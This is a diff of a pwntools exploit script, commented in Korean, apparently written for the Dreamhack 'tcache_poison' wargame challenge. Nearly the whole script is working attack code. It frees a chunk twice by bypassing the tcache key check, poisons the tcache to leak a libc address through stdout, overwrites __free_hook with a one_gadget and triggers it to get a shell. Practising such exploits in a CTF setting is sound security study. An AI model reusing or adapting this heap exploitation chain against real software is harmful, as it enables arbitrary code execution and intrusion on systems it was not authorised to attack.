@@ -1,77 +1,116 @@
 from pwn import *
+
+
 def slog(name, addr):
-	return success(": ".join([name, hex(addr)]))
+    return success(": ".join([name, hex(addr)]))
+
+
+#context.log_level = "debug"
 
 # Local
-LOCAL = False
+LOCAL = True
 if LOCAL:
-	p = process("./tcache_poison")
+    p = process("./tcache_poison")
+    libc = ELF("./libc_test/libc6-amd64_2.15-0ubuntu10.23_i386.so")
+    #p = process("./tcache_poison", env={'LD_PRELOAD': "./libc-2.27.so"})
 else:
-	PORT = int(input("Port: "))
-	HOST = int(input("Host: "))
-	p = remote("host"+str(HOST)+".dreamhack.games", PORT)
+    PORT = int(input("Port: "))
+    HOST = int(input("Host: "))
+    p = remote("host"+str(HOST)+".dreamhack.games", PORT)
+    libc = ELF("./libc-2.27.so")
+
 
 def alloc(size, data):
-	p.sendlineafter("Edit\n", "1")
-	p.sendlineafter(":", str(size))
-	p.sendafter(":", data)
+    p.sendlineafter("Edit\n", b"1")
+    p.sendlineafter(":", str(size))
+    p.sendafter(":", data)
+
 
 def free():
-	p.sendlineafter("Edit\n", "2")
+    p.sendlineafter("Edit\n", b"2")
+
 
 def print_chunk():
-	p.sendlineafter("Edit\n", "3")
+    p.sendlineafter("Edit\n", b"3")
+
 
 def edit(data):
-	p.sendlineafter("Edit\n", "4")
-	p.sendafter(":", data)
+    p.sendlineafter("Edit\n", b"4")
+    p.sendafter(":", data)
+
 
 elf = ELF("./tcache_poison")
-libc = ELF("./libc-2.27.so")
 
-# [1] malloc 1회 생성	
-alloc(0x30, "dreamhack")
+# [1] malloc 1회 생성
+alloc(0x30, b"dreamhack")
 free()
 # malloc 할당된 청크의 주소 = X라고 할 때
 # 현재 tcache: X
 
 # [2] fd: AAAAAAAA, key 부분에 \x00 추가함으로써 DFB 우회
 # 이후 tcache에 동일한 chunk 들어감
-edit("A" * 0x8 + "\x00")
+edit(b"A" * 0x8 + b"\x00")
 free()
-# 동일한 청크가 2번이나 tcache에 중복으로 들어가지만 (tcache duplication)
-# 차례를 구분하기 위해 처음을 X, 나중을 X'으로 구분한다.
-# 현재 tcache: X -> X(X'), X = X'
+# 동일한 청크가 2번이나 tcache에 중복으로 들어간다. (tcache duplication)
+# 현재 tcache: X <-> X (재귀)
 
-# [3] stdout 
+# [3] stdout
 addr_stdout = elf.symbols["stdout"]
 alloc(0x30, p64(addr_stdout))
 # X'의 data 영역에 addr_stdout이 쓰이게 되고
 # 이는 곧 X의 fd가 되고, tcache에는 다음에 할당되어야 할 chunk의 주소로써 들어가게 된다.
-# 현재 tcache: X -> (stdout -> __IO_2_1_stdout_)
+# 현재 tcache: (1) X -> (2) (stdout -> __IO_2_1_stdout_)
+
+gdb.attach(p)
 
 # [4] fd에 stdout을 넣어 그 다음인 _IO_2_1_stdout_으로 연결
 # libc-2.27.so에서 stdout의 하위 3바이트는 760
-alloc(0x30, "B" * 0x8)
-alloc(0x30, "\x60")
+alloc(0x30, b"B" * 0x8)
+# tcache: (stdout -> __IO_2_1_stdout_)
+if LOCAL == True:
+    alloc(0x30, b"\x60")
+else:
+    alloc(0x30, b"\x60")
+# tcache에 있던 stdout에 할당
 # stdout은 중요한 환경변수이므로 값이 변경되면 안 된다.
-
 
 # [5] libc_base & one_gadget
 print_chunk()
 p.recvuntil("Content: ")
 stdout = u64(p.recv(6).ljust(8, b"\x00"))
+print(hex(stdout))
+print(hex(libc.symbols["_IO_2_1_stdout_"]))
+print(hex(libc.symbols["stdout"]))
+print(hex(libc.symbols["__free_hook"]))
 libc_base = stdout - libc.symbols["_IO_2_1_stdout_"]
 free_hook = libc_base + libc.symbols["__free_hook"]
-one_gadget = libc_base + 0x4f432
+if LOCAL == True:
+    one_gadget = libc_base + 0xe3afe
+else:
+    one_gadget = libc_base + 0x4f432
 
+slog("libc_base", libc_base)
 slog("free_hook", free_hook)
 slog("one_gadget", one_gadget)
-p.interactive()
 
 # [6] Overwrite free hook with one gadget
-alloc(0x40, "dreamhack")
+alloc(0x40, b"dreamhack")
+free()
+# tcache: Y
+# fd: 0x00
+edit(b"C" * 8 + b"\x00")
+free()
+# tcache: Y <-> Y
+# fd: Y
+alloc(0x40, p64(free_hook))
+# tcache: (1) Y -> (2) free_hook(Y가 빠지고 재귀적으로 가리키던 곳에 free_hook이 들어옴)
+alloc(0x40, b"D"*8)
+# tcache: free_hook
+alloc(0x40, p64(one_gadget))
+# tcache에 있던 free_hook 부분에 할당이 되면서 one_gadget이 쓰임
+
+
+# [7] Call system with free hook
 free()
 
-
-
+p.interactive()
